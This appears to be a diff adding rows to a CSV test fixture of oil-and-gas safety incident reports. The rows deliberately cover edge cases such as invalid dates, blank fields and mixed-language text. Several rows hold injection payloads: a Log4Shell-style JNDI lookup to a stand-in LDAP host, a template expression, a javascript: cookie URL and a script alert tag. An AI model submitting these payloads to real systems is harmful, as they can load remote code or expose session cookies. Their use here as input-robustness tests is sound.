+aeb332db-9b25-4445-86fc-101d9fe5e089,,Gas-Processing-Unit,HSE,Permit closed correctly after hot work and gas test.,True
+7bd7266d-9fc7-4002-995c-98ad1528718c,2026-08-24,unknown,unknown,Gas detector bump test due.,True
+73ecac04-33e4-44e9-a3ef-bb8a91d3c9f3,last Friday,,,Narrative uses a relative date rather than an ISO date.,True
+48273a1e-1b6f-41b7-a247-a9589a0e89b9,2026-02-20,Gas-Processing-Unit,Welding,éèà हिन्दी हिंदी ગુજરાતી தமிழ் বাংলা العربية 中文,True
+e0fb1706-fe92-4b8e-afae-f581dadc4ad4,2026-07-08,Chemical-Plant-C,HSE,"Shift handover included open permits, isolations, alarms, and outstanding maintenance actions.",True
+9492f04e-7a4b-4007-8a66-924f0345e9db,2026-01-28,Tank-Farm-7,Instrumentation,Help,True
+b2fe99b2-1408-46a4-8f2f-9b571c369ff8,2026-02-10,Offshore-Platform-3,Operations,asdf QQQ 9911 !!! ??? ### @@@ %%% <> {} [] ~~ ^^^,True
+2ecc996d-3fe2-4e30-bf85-dc16a625d597,2026-08-25,0,123,Barricade moved from original position.,True
+bdab0160-6f0a-4b46-b162-4fbb181714ab,2026-02-15,Pipeline-Station-4,Operations,{{7*7}} ${jndi:ldap://example.test/a},True
+02218304-e762-4c9d-bf7e-dee12e211805,2026-01-27,LNG-Train-2,Electrical,Issue,True
+c67ddb4b-78ac-4a6b-915e-d0c263e3a522,2026-08-23,N/A,N/A,LOTO verified.,True
+1bfae3af-8ab9-49ac-89fd-9370648c5331,2026-06-17,Fabrication-Yard,Operations,A forklift reversed close to the pedestrian route while the audible warning was intermittent.,True
+15f131e4-6a95-4792-bd49-a637e7a91add,2026-08-19,   ,Operations,Pump trip during startup; investigation opened.,True
+72ca4e21-a47c-4f50-8ab9-f2849d279234,2026-10-09,LNG-Train-2,Logistics,"लाइन का pressure थोड़ा jump किया, फिर normal हो गया; trend check pending.",True
+16df4f1c-072d-491f-86bc-54dc21c962f9,2026-07-07,Fabrication-Yard,Maintenance,Lifting gear inspection completed; certificates were current and tag numbers matched the register.,True
+30a7f6b5-812f-4c6c-852d-aaa3275c1e29,2026-03-04,Gas-Processing-Unit,Mechanical,"During rounds, a small hydrocarbon drip was observed below a flange; the source was isolated and maintenance notified.",True
+c0d123ae-6229-4fa9-a1ca-8825d8583df3,2026-06-15,Offshore-Platform-3,Electrical,The pressure gauge could only be read by leaning across the pipework and reaching beyond the handrail.,True
+f6e91727-a1c4-4d40-9ed9-f2bd07f58986,2026-05-09,LNG-Train-2,Welding,"Bhai, cable temporary support pe latak raha tha aur neeche se log nikal rahe the; route divert kar diya.",True
+452a1376-a2bc-4bea-a648-03bef2377ddc,2026-10-08,Refinery-A,Production,"हाइड्रोकार्बन की हल्की गंध मिली, लेकिन detector reading normal थी; area rechecked.",True
+bfb1f110-1f07-432c-a9bc-738e1da39465,1900-01-01,Terminal-B,HSE,Suspicious historical date entered for a current operational event.,True
+a0e018c3-6039-4187-9290-8da9673168af,2026-04-16,Refinery-A,Logistics,"Entry team was inside the vessel, hot-work equipment was energized at the manway, and a valve spool was being moved through the same area.",True
+868c96e0-9eaf-484f-a5b0-a2fd8f05dbed,2024-02-29,Gas-Processing-Unit,Mechanical,Incident was reported on 2026-03-01 but text says it occurred on 29-Feb-2024.,True
+4393bb41-c2e2-4de7-9443-9a745ea2c86a,2026-10-01,Refinery-A,Welding,The worker said: 'all clear'; independent verification disagreed.,True
+664f8d18-2d12-4297-bae3-f0562927d5c6,2026-04-11,Gas-Processing-Unit,Instrumentation,SIMOPS: crew entered a confined space while hot work was prepared at the access point and another worker stood in the line of fire of a suspended spool.,True
+37651777-cfb5-4fe3-9c4f-61600c7e5802,2026-08-26,None,HSE,No issue found.,True
+165f8c93-a588-44ba-a806-4eee02998b5e,2026-08-28,"Refinery-A, Terminal-B","Operations, HSE",Permit reviewed.,True
+a7d49f6a-ca66-4acd-a043-15413057b423,2026-05-31,Offshore-Platform-3,Operations,ESD test completed correctly and all personnel remained outside the exclusion zone.,True
+a4eaf6b2-dd82-4a24-ba42-5a985f5e6b13,,,,,True
+6901daea-0b13-4daf-8401-d7011d7da3fc,2026-06-13,Offshore-Platform-3,Welding,Metal-on-metal contact and increasing oscillation were noticed at the pipe support; no leak was visible.,True
+e0506861-636b-4e00-bb0f-dd8269768f51,2026-08-20,Refinery-A  , Maintenance ,Minor seepage near flange; monitored.,True
+3f524337-9566-4aed-b641-7dc92edf39d1,2026-01-26,Gas-Processing-Unit,Mechanical,OK,True
+1c24ee8d-fa6b-45dd-838a-90ca546d1f5b,2026-09-11,Pipeline-Station-4,Mechanical,During rounds a small hydrocarbon drip was seen below the flange. Source isolated; maintenance notified.,True
+bacce04f-8649-486a-8920-0dbb8e37bf14,2026-07-10,Chemical-Plant-C,HSE,"Confined-space entry controls were verified, including gas testing, attendant, rescue equipment, and permit.",True
+ebec9ff9-24a8-4454-a357-37343d06dea7,2026-08-31,LNG Train 2,Control Room,ESD test complete.,True
+3434ed0e-80be-40e0-9d0a-8882e5a63122,2026-01-03,Terminal-B,HSE,   ,True
+d2f9c017-7449-4d94-97cf-f47b361e8fc9,2026-01-19,Fabrication-Yard,Logistics,Nil,True
+c93d7901-2ba8-4d09-a745-9a418bdb8c06,2026-10-22,LNG-Train-2,Electrical,"Report text contains CRLF-style multiline content.
+Second line after carriage return.",True
+78331398-fb64-4ba5-af8d-dbf89f3ddae8,2026-05-14,Offshore-Platform-3,Mechanical,"Thodi der ke liye access gate block ho gaya tha, emergency response route clear karwa diya.",True
+07d2b3af-b221-4bb2-aa27-3d2b41f951e4,2026-03-03,Terminal-B,HSE,"During rounds, a small hydrocarbon drip was observed below a flange; the source was isolated and maintenance notified.",True
+f5dde0a9-c833-4681-b619-f0611915f851,2026-07-21,Fabrication-Yard,Welding,Text says the valve was isolated and not isolated at the same time; field verification required.,True
+46c09f68-5f30-454d-ada0-d007f7708a71,2026-09-01,Rig#5,Drilling,BOP test complete.,True
+f69025d7-da1b-4be3-b517-71a797af9c87,2026-02-14,Offshore-Platform-3,Utilities,javascript:alert(document.cookie),True
+940841ea-f9ea-4840-8942-91a48ad773b3,2026-04-23,Gas-Processing-Unit,Electrical,Confined-space crew reported poor visibility; welding was occurring at the adjacent nozzle and a worker stepped into the load travel envelope.,True
+d86c2fbd-a47c-4f53-9b48-5967fac0cae2,yesterday,Chemical-Plant-C,Welding,Report text says the event happened yesterday.,True
+8d5b00c8-6045-44e3-85ad-958030055a5c,2025-02-29,Terminal-B,HSE,"The report says 29 February 2025, an invalid date.",True
+39dbd88f-cfac-424a-9bfa-15e78c5d530f,2026-09-09,Drilling-Rig-5,Logistics,Small hydrocarbon drip was observed below a flange; source was isolated and maintenance notified.,True
+4f454691-5f74-4a61-b9f4-befc99f9f446,2026-08-22,Site-???,Electrical/Mechanical,Cable issue near MCC.,True
+a0dd59a7-a9b6-42cb-83fe-a05c986bbc7c,2026-07-27,Drilling-Rig-5,Mechanical,Unicode normalization edge: café / café appears in the same report.,True
+0867e300-3d81-4fbd-bb40-e2e487cceed8,2026-02-14,Offshore-Platform-3,Instrumentation,Pressure was higher than expected during line-up.,True
+b7df43bc-68dc-499d-a00e-d49435f63ad0,2026-02-07T25:61:00,Fabrication-Yard,Logistics,Timestamp contains impossible hour and minute.,True
+05734ad8-504d-4be0-bd25-e6f09ba5da99,2026-10-21,Gas-Processing-Unit,Mechanical,"Department field contains slash, ampersand, and hyphen: HSE/QA & Compliance - Night.",True
+b53328ca-6608-4973-88e9-a8a5ca89700e,2026-06-04,Pipeline-Station-4,Production,ESD pushbutton test was completed during a toolbox talk with correct permit controls and communication.,True
+c2202403-2e96-429b-80aa-cba876d5f551,2026-06-20,Offshore-Platform-3,Electrical,The emergency gate opened only partially because stored materials had been placed behind it.,True
+ff48353e-0ccf-448c-945d-df435243e940,2026-10-18,Refinery-A,Operations,Report ID should remain unique even when report text is identical.,True
+84c7daf8-7fdb-4e3f-8d64-b51622b603e9,2026-07-24,Offshore-Platform-3,Instrumentation,"A witness says the event occurred before shift start, while the report metadata places it after shift end.",True
+49171c5d-03af-42ad-8f37-dc1f368fb0db,2026-05-04,Gas-Processing-Unit,Electrical,"Valve ka handwheel jam tha; force nahi lagaya, supervisor ko inform karke JSA review kiya.",True
+837d497a-0d73-499f-9d23-a75a333e81c1,2026-10-05,Fabrication-Yard,Mechanical,Two negatives: no no-go zone was not established.,True
+3e457a5b-f2f8-434e-9c8d-f9c57650f4fe,2026-07-09,Terminal-B,Logistics,Emergency drill completed; muster accountability and radio communication were satisfactory.,True
+2ce6e7a9-35ac-4349-a12d-8a9e1f09e322,2026-01-11,,,Near miss.,True
+366afba9-ce3d-4bc8-a414-864655eae622,2026-10-02,Refinery-A,Maintenance,"H2S? reading was written as ""<10 ppm"" with no exact value captured.",True
+420de95e-c592-48f1-ad7a-c7ed5330055f,2026-10-26,Chemical-Plant-C,Welding,Risk assessment completed before work; no unsafe condition found.,True
+70250dec-b889-408a-a9fe-9d9a8f59220f,03/04/2026,LNG-Train-2,Electrical,Potentially ambiguous date format; shift log says 03/04/2026.,True
+b17746d4-bf1c-402e-a93a-5adecaa0c109,2026-06-21,Chemical-Plant-C,Utilities,A narrow access point forced two workers to pass close to an operating rotating machine.,True
+31202bb5-b04e-4213-a785-ace5afd9a8e7,2026-02-11,LNG-Train-2,Mechanical,<script>alert('xss')</script>,True
+becd8fd2-2c85-4af3-b4b2-4afcb6a7ecc2,2026-04-25,Offshore-Platform-3,Production,"Entry team, welder, and crane crew were operating within overlapping boundaries; the potential for simultaneous escalation was noted.",True
+9af7f7a2-047b-4091-b481-35e62a5f6274,2026-04-31,Offshore-Platform-3,Maintenance,"The report states the event occurred on April 31, which does not exist.",True
+4ff2ac8b-6ae9-4b6b-978b-ed3d0d1642ca,2026-07-28,Refinery-A,Maintenance,Very long unbroken token: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX,True
+e2a631d9-6c54-4352-9f57-8beb4eb86e3e,2026-10-03,Gas-Processing-Unit,HSE,"Pressure noted as ""~18 bar"" rather than an exact measurement.",True
+d18226d5-fcef-4e0f-9e86-54b80f01faeb,2026-07-03,Tank-Farm-7,Electrical,BOP test completed with acceptable readings and documented in the shift log.,True
+81482b6f-a262-4f6f-a952-d5f291a20a83,2026-01-18,Pipeline-Station-4,Production,NA,True
+9e715836-a654-45d7-922f-a635f9eed7e4,,,Mechanical,Workers were inside the lifting envelope while crane was slewing.,True
+18e0dd03-5a3f-4ed9-9af1-8fa96f68b3a5,2026-01-21,Drilling-Rig-5,Utilities,null,True
+d0d9782a-cbc4-4ac6-9419-b3209b3535f6,2026-06-01,Offshore-Platform-3,HSE,"P&ID revision was confirmed, LOTO points matched, and MBR sign-off was completed before line opening.",True
+a287bbb8-8a0d-458b-bf92-b15493b88ea7,2026-10-20,Terminal-B,HSE,Site field has embedded comma and quote-like content.,True
+0c796afa-cbed-454e-a6fc-09237ae11905,2026-02-21,Pipeline-Station-4,Mechanical,%%%% %%% %%%% %%%%% %%%% ,True
+59b62b06-a9e9-4b2e-9cd0-2e3cbf2d06eb,2026-06-11,Chemical-Plant-C,Electrical,"When the nearby pump started, the valve handle moved slightly even though no one was touching it.",True
+7447b54e-1a27-40fe-8b4c-c6d997cdecf5,2026-10-06,Pipeline-Station-4,Operations,"Possibly maybe likely potentially elevated risk, but evidence is incomplete.",True
+cae8b5d8-c84f-4abc-a3b4-1017cade4f64,2026-05-30,Chemical-Plant-C,Logistics,"BOP panel alarm appeared briefly during startup; no trip occurred, but trend review was requested.",True
+970af5c4-5246-47d9-a44f-05d89830459b,2026-05-24,Terminal-B,Mechanical,ESD valve response appeared slower than expected during functional test; instrumentation notified.,True
+aa2fabc8-8feb-4317-9d03-eeb2bb335ea1,2026-06-30,Refinery-A,Utilities,"Toolbox talk completed; hazards, controls, stop-work authority, and emergency contacts were reviewed.",True
+fc887434-54e1-43d8-8629-c154b42dd0ed,2026-01-13,Offshore-Platform-3,Maintenance,Arc flash.,True
+3c8473a0-84cc-4c4f-ac90-c9ce341e9eae,2026-10-27,Drilling-Rig-5,Utilities,The same physical event is described twice in one report: vibration observed; vibration observed.,True
+cb1d38e2-9025-490b-9c46-9f8ee6ca9d64,2026-03-07,Pipeline-Station-4,Production,"During rounds, a small hydrocarbon drip was observed below a flange; the source was isolated and maintenance notified.",True
+d1df0c64-425b-41ae-946f-ddb5bb41cdaf,2026-08-30,OFFSHORE_PLATFORM_3,I&C,PSV inspection due.,True
+2e7209fc-548e-4e25-b199-4ca17d1ca62e,2026-01-16,LNG-Train-2,Electrical,...,True
+3c50b28b-066b-48ee-9207-ee5f9afeb94f,2026-06-14,LNG-Train-2,Instrumentation,A worker held a loose electrical cable with one hand while climbing the access ladder.,True
+89765bdb-54de-4022-8b09-72ff4d807112,2026-08-27,"Refinery-A
+Terminal-B",Operations,Pressure trend reviewed.,True
+59cf7c21-3675-4cbc-9037-c3046bed7e79,2026-06-24,Chemical-Plant-C,Welding,"During rounds, an unusual vibration was felt through the handrail near rotating equipment before any alarm activated.",True
+a3a71e07-ac76-4b6c-9d5c-0cf156631b07,2026-01-15,Gas-Processing-Unit,Mechanical,Overpressure.,True
+8008e5ee-9166-4422-936e-ea0a67cd0273,2026-02-16,,Maintenance,   ,True
+883dbb75-f8aa-480d-86b8-9f38f0cbba0f,2026-03-02,Offshore-Platform-3,Maintenance,"During rounds, a small hydrocarbon drip was observed below a flange; the source was isolated and maintenance notified.",True
